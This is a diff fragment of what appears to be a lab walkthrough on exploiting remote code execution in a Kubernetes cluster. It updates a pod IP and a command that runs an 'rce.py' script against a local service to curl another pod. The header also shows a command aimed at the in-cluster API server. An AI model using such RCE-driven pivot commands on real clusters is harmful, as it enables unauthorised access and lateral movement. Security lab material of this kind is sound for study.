@@ -153,9 +153,9 @@ python scripts/rce.py http://localhost:8080 "APISERVER=https://kubernetes.defaul
       #        {
       #          "containerPort": 80,
       #          "protocol": "TCP"
-      #  "podIP": "10.244.1.17",
+      #  "podIP": "10.244.1.19",
 
-python scripts/rce.py http://localhost:8080 "curl -sS http://10.244.1.17"
+python scripts/rce.py http://localhost:8080 "curl http://10.244.1.19"
 
 ```
 
